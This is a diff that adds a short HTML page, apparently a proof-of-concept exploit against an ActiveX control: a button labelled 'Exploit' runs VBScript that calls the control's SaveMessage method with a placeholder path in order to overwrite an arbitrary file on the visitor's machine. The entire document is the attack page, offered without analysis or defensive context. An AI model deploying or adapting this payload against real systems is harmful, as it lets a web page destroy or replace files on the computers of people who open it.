@@ -1,0 +1,13 @@
+<html>
+<object classid='clsid:0014085F-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = 'vbscript'>
+
+Sub Boom()
+arg1="FilePath\Filename_to_overwrite"
+arg2=True
+target.SaveMessage arg1 ,arg2
+End Sub
+
+</script>
+</html>
